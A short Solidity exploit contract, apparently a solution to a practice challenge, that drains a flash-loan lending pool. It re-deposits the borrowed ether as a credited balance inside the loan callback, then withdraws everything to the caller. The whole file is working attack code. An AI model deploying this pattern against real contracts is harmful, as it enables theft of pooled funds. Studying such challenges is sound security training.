// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

import "./SideEntranceLenderPool.sol";

contract PoolAttacker is IFlashLoanEtherReceiver {
    using Address for address payable;

    SideEntranceLenderPool private lenderPool;

    constructor(address _lenderPool) {
        lenderPool = SideEntranceLenderPool(_lenderPool);
    }

    function execute() public payable override {
        lenderPool.deposit{value: msg.value}();
    }

    function attack() public {
        lenderPool.flashLoan(address(lenderPool).balance);
        lenderPool.withdraw();
        payable(msg.sender).sendValue(address(this).balance);
    }

    receive() external payable {}
}
